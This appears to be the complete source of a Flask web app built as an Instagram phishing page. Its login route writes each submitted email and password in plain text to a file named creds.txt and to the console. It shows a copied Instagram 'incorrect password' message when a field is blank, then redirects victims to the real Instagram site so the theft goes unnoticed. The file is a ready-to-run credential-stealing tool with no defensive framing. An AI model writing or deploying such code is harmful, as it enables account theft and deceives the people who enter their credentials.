from flask import Flask, request, render_template, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', error=None)

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    # Save to file
    with open("creds.txt", "a") as f:
        f.write(
            f"\n========= NEW LOGIN =========\n"
            f"EMAIL: {email}\n"
            f"PASSWORD: {password}\n"
            f"=============================\n"
        )

    # Also print nicely to logs
    print("\n========= NEW LOGIN =========")
    print(f"EMAIL: {email}")
    print(f"PASSWORD: {password}")
    print("=============================\n")

    # Fake error if blank
    if email.strip() == "" or password.strip() == "":
        error = "Sorry, your password was incorrect. Please double-check your password."
        return render_template('index.html', error=error)

    # Redirect to real Instagram
    return redirect("https://www.instagram.com/")

@app.route('/forgot')
def forgot():
    return render_template('forgot.html')

if __name__ == "__main__":
    app.run()
